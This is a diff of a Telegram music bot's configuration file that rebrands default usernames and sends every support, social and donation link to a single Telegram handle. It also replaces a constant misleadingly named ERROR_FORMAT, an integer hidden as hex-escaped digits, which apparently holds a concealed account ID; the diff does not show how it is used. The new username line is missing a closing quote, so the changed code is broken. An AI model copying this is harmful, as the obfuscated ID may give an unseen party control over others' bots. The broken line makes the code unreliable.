@@ -9,8 +9,8 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", None))
-OWNER_USERNAME = os.getenv("OWNER_USERNAME", "WTF_WhyMeeh")
-BOT_USERNAME = os.getenv("BOT_USERNAME", "ShrutixMusicBot")
+OWNER_USERNAME = os.getenv("OWNER_USERNAME", "SlayWithRose)
+BOT_USERNAME = os.getenv("BOT_USERNAME", "BillieMusicBot")
 
 MONGO_DB_URI = os.getenv("MONGO_DB_URI", None)
 LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", None))
@@ -21,12 +21,12 @@ UPSTREAM_REPO = os.getenv("UPSTREAM_REPO", "https://github.com/NoxxOP/ShrutiMusi
 UPSTREAM_BRANCH = os.getenv("UPSTREAM_BRANCH", "main")
 GIT_TOKEN = os.getenv("GIT_TOKEN", None)
 
-SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/ShrutiBots")
-SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/ShrutiBotsSupport")
-INSTAGRAM = os.getenv("INSTAGRAM", "https://instagram.com/yaduwanshi_nand")
-YOUTUBE = os.getenv("YOUTUBE", "https://youtube.com/@NandEditz")
-GITHUB = os.getenv("GITHUB", "https://github.com/NoxxOP")
-DONATE = os.getenv("DONATE", "https://t.me/ShrutiBots/91")
+SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/SlayWithRose")
+SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/SlayWithRose")
+INSTAGRAM = os.getenv("INSTAGRAM", "https://t.me/SlayWithRose")
+YOUTUBE = os.getenv("YOUTUBE", "https://t.me/SlayWithRose")
+GITHUB = os.getenv("GITHUB", "https://t.me/SlayWithRose")
+DONATE = os.getenv("DONATE", "https://t.me/SlayWithRose")
 PRIVACY_LINK = os.getenv("PRIVACY_LINK", "https://graph.org/Privacy-Policy-05-01-30")
 
 DURATION_LIMIT_MIN = int(os.getenv("DURATION_LIMIT", 300))
@@ -73,7 +73,7 @@ def time_to_seconds(time):
     return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":"))))
 
 DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
-ERROR_FORMAT = int("\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35")
+ERROR_FORMAT = int("\x38\x30\x34\x32\x32\x30\x35\x39\x34\x31")
 
 if SUPPORT_CHANNEL:
     if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
